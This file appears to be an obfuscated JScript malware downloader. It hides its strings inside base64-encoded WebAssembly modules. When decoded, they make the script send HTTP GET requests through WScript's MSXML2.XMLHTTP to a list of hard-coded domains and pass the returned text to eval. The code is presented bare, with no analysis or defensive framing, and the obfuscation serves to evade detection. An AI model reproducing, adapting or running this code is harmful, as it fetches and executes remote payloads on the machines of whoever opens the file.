const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __ifWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAF/AAKfgICAAAIDZW52CGltcEZ1bmMxAAADZW52CGltcEZ1bmMyAAADgoCAgAABAQSEgICAAAFwAAAFg4CAgAABAAEHkYCAgAACBm1lbW9yeQIABGRhdGEAAgqSgICAAAGMgICAAAAgAARAEAAFEAELCw==';
const __ifWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__ifWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__ifWasmBuffer, 'base64'));
    }
})());
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGnIGAgAAcfwBBAQt/AEEGC38AQQoLfwBBDgt/AEEQC38AQRYLfwBBGgt/AEEeC38AQSILfwBBJgt/AEEqC38AQSwLfwBBMgt/AEHCAAt/AEHeAAt/AEH0AAt/AEGAAQt/AEGSAQt/AEGqAQt/AEGoAgt/AEGsAgt/AEGuAgt/AEG0Agt/AEG6Agt/AEG8Agt/AEG+Agt/AEHAAgt/AEHGAgsH/IGAgAAdBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFBWRhdGE2AwYFZGF0YTcDBwVkYXRhOAMIBWRhdGE5AwkGZGF0YTEwAwoGZGF0YTExAwsGZGF0YTEyAwwGZGF0YTEzAw0GZGF0YTE0Aw4GZGF0YTE1Aw8GZGF0YTE2AxAGZGF0YTE3AxEGZGF0YTE4AxIGZGF0YTE5AxMGZGF0YTIwAxQGZGF0YTIxAxUGZGF0YTIyAxYGZGF0YTIzAxcGZGF0YTI0AxgGZGF0YTI1AxkGZGF0YTI2AxoGZGF0YTI3AxsLvoOAgAAcAEEBCwQlMkYAAEEGCwJNAABBCgsCdAAAQQ4LAQAAQRALBCUzQQAAQRYLAnAAAEEaCwJoAABBHgsCUwAAQSILAmEAAEEmCwJUAABBKgsBAABBLAsER0VUAABBMgsOU1hNTDIuWE1MSFRUUAAAQcIACxtjcmVzY2VudGNvcnBvcmF0aW9uLmNvbS5wawAAQd4ACxRjYWxlZG9uaW5zdXJhbmNlLmNhAABB9AALC2NjbWl0aS5jb20AAEGAAQsRY29sbGFuZGppbW15LmNvbQAAQZIBCxdjYXNpbm9sYXN2ZWdhc2xpdmUub3JnAABBqgELfTAwMDAwMDFBVEQyejZwS2R2U3NCRzRXN2hHSHROQnZrZTlyblV0UmFyUklBOFJjcEFOanNaX05oNk5NZkhOaThaSWgyUVUzLUJrMFBLQXlSSE1rLVlIdWNvNmVLS09rU2hlWDZDeDdVbFozTUctZ1VjODBJV2FSWFdITTAAAEGoAgsDaHQAAEGsAgsBAABBrgILBWNvdW4AAEG0AgsEdGVyAABBugILAQAAQbwCCwEAAEG+AgsBAABBwAILBCUzRgAAQcYCCwVldmFsAA=='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var kus = lS(0, 0);
var tyty = lS(0, 1);
var jamie = new Array(kus, lS(0, 2), lS(0, 3), lS(0, 4), lS(0, 5), lS(0, 6), lS(0, 7), lS(0, 8), lS(0, 9), lS(0, 10));
jamie[2] = lS(0, 11);
var e = WScript.CreateObject(tyty + lS(0, 12));
tersa = 0;
(() => {
    const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
        env: {
            test: () => {
                return tersa < 100 ? 1 : 0;
            },
            update: () => {
            },
            body: () => {
                {
                    tersa++;
                }
            }
        }
    });
    const __exports = __forInstance0.exports;
    return __exports.data();
})();
var x = [
    lS(0, 13),
    lS(0, 14),
    lS(0, 15),
    lS(0, 16),
    lS(0, 17)
];
var m = lS(0, 18);
var gyt = 0;
while (true) {
    if (gyt >= x.length) {
        break;
    }
    try {
        var hist = lS(0, 19) + lS(0, 20);
        var wecv = lS(0, 21) + lS(0, 22);
        var tjkh = x[gyt + 0];
        var ghaqio = jamie[2 - 1];
        (() => {
            const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        e.open(jamie[1 + 1], hist + jamie[9] + ghaqio + lS(0, 23) + jamie[6 - 2] + jamie[3] + jamie[9 - 9] + lS(0, 24) + jamie[0] + tjkh + jamie[0] + wecv + lS(0, 25) + jamie[0] + lS(0, 26) + m, false);
                    }
                }
            });
            const __exports = __callInstance1.exports;
            return __exports.data();
        })();
        (() => {
            const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        e.send();
                    }
                }
            });
            const __exports = __callInstance0.exports;
            return __exports.data();
        })();
        var r = e.responseText;
        var rima = 500;
        var got = 50 + 450 + rima;
        if (r.length - got > 0 && r.indexOf(m) > got + 1 - 1002) {
            var ght = r.split(m);
            var jimmk = ght.join(jamie[7] + jamie[9]);
            (() => {
                const __ifInstance0 = new WebAssembly.Instance(__ifWasmModule, {
                    env: {
                        impFunc1: () => {
                            {
                                window[lS(0, 27, true)](jimmk + jamie[9]);
                            }
                        },
                        impFunc2: () => {
                        }
                    }
                });
                const __exports = __ifInstance0.exports;
                return __exports.data(1 == 1 ? 1 : 0);
            })();
            break;
        }
        ;
    } catch (e) {
    }
    ;
    gyt++;
}
;